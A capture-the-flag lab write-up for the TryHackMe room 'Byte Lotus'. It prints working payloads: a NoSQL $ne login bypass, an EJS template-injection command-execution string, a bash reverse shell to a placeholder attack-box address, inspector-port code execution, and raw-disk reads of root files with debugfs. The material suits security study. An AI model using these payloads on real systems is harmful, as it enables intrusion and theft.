---
title: "TryHackMe - Byte Lotus: Do Not Disturb"
date: 2026-08-02
tags: ["TryHackMe", "Penetration Testing", "NoSQL Injection", "SSTI", "Node.js", "Privilege Escalation"]
excerpt: "Picking up a prior attacker's trail through the Byte Lotus poolside platform — a NoSQL auth bypass, an EJS template injection, and a stray Node inspector port that hands over raw disk access."
---

# TryHackMe: Byte Lotus — Do Not Disturb

**Room theme:** The poolside guest-experience platform. The room's framing is unusual — someone is already inside the system ("a session goes warm on a sunbed, and a stranger sits down in it... a shell on the beach answers back"), and the objective is to follow that existing intrusion in and climb the same way it climbed.

**Goal:** User flag and root flag, via lab machine + attackbox this time rather than a standalone capture or a static target.

## Recon

```
nmap -p- -sV -sC -T4 <target>
```

Two ports: SSH, and a Node.js/Express app on port 80 titled "Byte Lotus — Poolside," redirecting everywhere to a `/login` form.

## NoSQL injection auth bypass

Express + a document-style datastore is a strong hint toward NoSQL injection if the login handler passes request body fields straight into a query. Testing the classic `$ne` operator against both fields confirmed it:

```
curl -s -i -X POST http://<target>/login -d 'username[$ne]=x&password[$ne]=x'
```

This returned a `302` to `/dashboard`-equivalent with a session cookie — the query effectively became "match any document where username isn't x and password isn't x," which matches the first user in the collection regardless of credentials. That user, however, wasn't privileged.

To land a specific account, the trick was keeping `username` a literal string (so it matches an exact document) while still injecting `$ne` on the password field only:

```
curl -s -c cookies.txt -X POST http://<target>/login -d 'username=attendant&password[$ne]=x'
```

Brute-forcing a short list of likely staff usernames this way (`staff`, `manager`, `attendant`, etc.) found `attendant` — the exact placeholder text shown in the login form's username field — which logged in with a `staff` role and full access to `/staff`.

## Server-side template injection (SSTI)

The staff console exposed a "customise the booking-confirmation message" feature that rendered a **user-submitted EJS template** server-side:

```
POST /staff/preview
playlist... err, template=<%= guest %>
```

EJS templates support arbitrary JavaScript inside `<% %>` tags, not just variable interpolation — classic SSTI. Confirmed with a harmless arithmetic probe:

```
template=<%= 7*7 %>
```

→ returned `49` in the rendered preview.

Escalating to code execution hit an early snag: `require` isn't defined inside the compiled EJS function's scope. The fix was pivoting through `process`, which *is* a true Node global reachable from anywhere:

```
template=<%= process.mainModule.require('child_process').execSync('id').toString() %>
```

→ `uid=996(poolside) gid=996(poolside) groups=996(poolside)`. Full RCE as the app's service account.

## Getting a shell (and a lesson in blocking calls)

The natural next step is a reverse shell via the same SSTI:

```
template=<%= process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKBOX_IP/4444 0>&1"').toString() %>
```

This landed a shell as `poolside` — fine, because the Express app has multiple worker capacity and losing responsiveness on one request doesn't matter once you're already inside via TCP.

**Important gotcha learned the hard way later:** `execSync()` blocks the entire Node.js event loop until the spawned child exits. Using it to launch an *interactive* reverse shell against a single-threaded target process (like the one below) permanently freezes that process, since the "child" never voluntarily exits. The fix is `spawn(...).unref()` instead — it detaches the child without blocking the parent's event loop, keeping the target process responsive to further commands afterward.

## User flag

```
cat /home/poolside/user.txt
```

```
THM{xxxx}
```

## Finding the second pivot: an exposed Node inspector

Standard privesc enumeration (`sudo -l`, SUID, capabilities, cron) turned up nothing. `ss -tulpn` told a different story:

```
tcp   LISTEN   127.0.0.1:9229
```

Port 9229 is Node's default Inspector/debugger port. Querying it revealed it was attached to a separate process:

```
curl -s http://127.0.0.1:9229/json
```

```json
{ "title": "processor.js", "url": "file:///opt/pipelinesvc/telemetry/processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<session-id>" }
```

`ps aux` confirmed this process ran as a different, unprivileged-looking service account: `pipelinesvc`.

## Hijacking the inspector for RCE

The Node Inspector protocol (Chrome DevTools Protocol over WebSocket) accepts a `Runtime.evaluate` method that executes arbitrary JavaScript in the target process — no extra tooling needed, just raw WebSocket framing, which is simple enough to hand-roll in Python (`socket` + manual HTTP upgrade handshake + masked frame construction, since RFC 6455 requires client-to-server frames to be masked).

First contact (using `execSync`, before learning the lesson above) confirmed code execution:

```
process.mainModule.require('child_process').execSync('id').toString()
```

```
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

Two things stood out immediately: a new user account, and membership in the **`disk`** group — direct read/write access to raw block devices, a well-known privilege escalation primitive.

Sending a reverse shell payload through the inspector using `execSync` (the same technique that worked for the SSTI shell) permanently deadlocked `processor.js` — the single-threaded Node process froze waiting on the interactive child that would never exit, and `Restart=always` in its systemd unit didn't help because that policy only fires on process *exit*, not on a hang, and no watchdog was configured. Resetting the lab machine and repeating the pivot with `spawn(...).unref()` instead avoided the freeze entirely and left the inspector responsive for further use.

## Root flag via raw disk access — no root shell needed

With `pipelinesvc`'s `disk` group membership confirmed, the intended path became clear: rather than escalate all the way to an actual root shell, group access to the block device is enough to read (or write) any file on the filesystem directly, completely bypassing normal Unix file permissions.

```
mount | grep ' / '
```

```
/dev/nvme0n1p1 on / type ext4 (rw,relatime,discard)
```

```
ls -la /dev/nvme0n1p1
```

```
brw-rw---- 1 root disk 259, 2 ... /dev/nvme0n1p1
```

Group-writable by `disk`. `debugfs` (part of `e2fsprogs`, already installed) can operate on an ext4 filesystem directly from its block device, without mounting:

```
debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
```

```
THM{xxx}
```

## Full chain summary

1. NoSQL `$ne` operator injection bypasses password checking on `/login`.
2. Guessed the `attendant` staff username (visible as placeholder text in the login form) combined with the same injection to land a privileged session.
3. EJS template preview feature renders user-controlled templates server-side → SSTI → RCE as `poolside`, pivoting through the `process` global since `require` isn't in scope inside compiled EJS.
4. A Node Inspector debugger left open on `127.0.0.1:9229`, attached to a separate `pipelinesvc`-owned process, gives a second RCE primitive via the Chrome DevTools Protocol.
5. `pipelinesvc`'s membership in the `disk` group grants raw read/write access to the root filesystem's block device.
6. `debugfs` reads `/root/root.txt` directly off the raw disk — full "root" data access without ever holding a literal root shell.

